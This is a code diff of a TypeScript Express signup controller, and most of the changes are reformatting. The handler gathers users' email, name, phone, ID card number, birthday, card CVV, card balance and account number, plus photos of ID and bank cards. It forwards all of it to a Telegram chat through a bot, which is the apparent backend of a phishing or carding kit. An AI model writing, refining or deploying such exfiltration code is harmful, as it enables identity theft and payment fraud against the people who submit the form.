@@ -10,9 +10,18 @@ const bot = new TelegramBot(TOKEN, { polling: false });
 export class AccountController {
   async signup(req: Request, res: Response) {
     try {
-      console.log("req.headers[x-forwarded-for]", JSON.stringify(req.headers["x-forwarded-for"]));
-      console.log("req.socket.remoteAddress", JSON.stringify(req.socket.remoteAddress));
-      console.log("req.connection.remoteAddress", JSON.stringify(req.connection.remoteAddress));
+      console.log(
+        "req.headers[x-forwarded-for]",
+        JSON.stringify(req.headers["x-forwarded-for"])
+      );
+      console.log(
+        "req.socket.remoteAddress",
+        JSON.stringify(req.socket.remoteAddress)
+      );
+      console.log(
+        "req.connection.remoteAddress",
+        JSON.stringify(req.connection.remoteAddress)
+      );
       const ip =
         req.headers["x-forwarded-for"] || req.socket.remoteAddress || "";
       const {
@@ -80,21 +89,25 @@ export class AccountController {
       });
 
       await account.save();
-      bot.sendMessage(
-        process.env.TELEGRAM_CHAT_ID,
-        `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}\n`
-      );
-      // send message and photo
-      frontIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontIdCard);
-      backIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backIdCard);
-      frontCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontCard);
-      backCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backCard);
+
+      await Promise.allSettled([
+        bot.sendMessage(
+          process.env.TELEGRAM_CHAT_ID,
+          `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}\n`
+        ),
+        frontIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontIdCard),
+        backIdCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backIdCard),
+        frontCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, frontCard),
+        backCard && bot.sendPhoto(process.env.TELEGRAM_CHAT_ID, backCard),
+      ]).catch((err) => {
+        console.log("err", err);
+      });
 
       return res.status(200).json({
         message: "Signup successfully",
       });
     } catch (error: any) {
-      console.log("error", error);
+      console.log("error", error.message);
       return res.status(500).json({
         message: error.message,
       });
